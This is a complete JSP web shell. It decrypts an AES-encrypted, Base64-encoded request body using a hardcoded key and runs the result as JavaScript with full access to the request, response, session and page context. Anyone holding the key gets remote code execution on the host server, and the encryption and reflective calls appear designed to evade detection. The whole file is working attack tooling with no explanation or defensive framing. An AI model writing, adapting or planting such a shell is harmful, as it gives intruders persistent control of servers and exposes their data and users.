<%@ page import="javax.script.ScriptEngine" %>
<%@ page import="javax.script.ScriptException" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" isELIgnored="false" %>

<%
    ScriptEngine engine = (new javax.script.ScriptEngineManager()).getEngineByName("js");
    engine.put("request",request);
    engine.put("response",response);
    engine.put("session",session);
    engine.put("pageContext",pageContext);
    String s = request.getReader().readLine();
    // AES decrypt start
    byte[] data = s.getBytes();
    String k="PadishahPadishah";
    javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));
    byte[] decodebs;
    Class baseCls ;
    baseCls=Class.forName("java.util.Base64");
    Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
    decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
    byte[] ss= c.doFinal(decodebs);
    // AES decrypt end
    s = new String(ss,StandardCharsets.UTF_8);
    try {
        engine.eval(s);
    } catch (ScriptException e) {
        throw new RuntimeException(e);
    }
%>

